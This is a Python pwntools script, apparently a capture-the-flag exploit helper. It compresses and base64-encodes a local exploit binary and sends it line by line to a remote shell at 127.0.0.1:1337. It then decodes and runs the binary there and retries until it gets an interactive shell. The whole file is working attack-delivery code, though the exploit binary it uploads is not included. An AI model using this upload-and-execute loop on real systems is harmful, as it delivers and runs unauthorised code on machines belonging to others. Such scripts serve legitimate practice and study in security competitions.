from pwn import *
import time, os
#context.log_level = "debug"

os.system("tar -czvf exp.tar.gz ./exp")
os.system("base64 exp.tar.gz > b64_exp")

total_count = 1
while True:
    log.info("total exp time: {}".format(total_count))

    p = remote("127.0.0.1", 1337)
    f = open("./b64_exp", "r")

    p.sendline()
    p.recvuntil("/ $")
    p.sendline("echo '' > /tmp/b64_exp;")

    count = 1
    while True:
        print('now line: ' + str(count))
        line = f.readline().replace("\n","")
        if len(line)<=0:
            break
        cmd = b"echo '" + line.encode() + b"' >> /tmp/b64_exp;"
        p.sendline(cmd) # send lines
        #time.sleep(0.02)
        #p.recv()
        p.recvuntil("/ $")
        count += 1
    f.close()

    p.sendline("base64 -d /tmp/b64_exp > /tmp/exp.tar.gz;")
    p.sendline("tar -xzvf /tmp/exp.tar.gz")
    p.sendline("chmod +x /tmp/exp;")
    p.sendline("/tmp/exp")

    rcv = p.recv()
    if b'fail' in rcv:
        log.debug("failed again!")
        total_count += 1
        continue
    else:
        p.interactive()
        break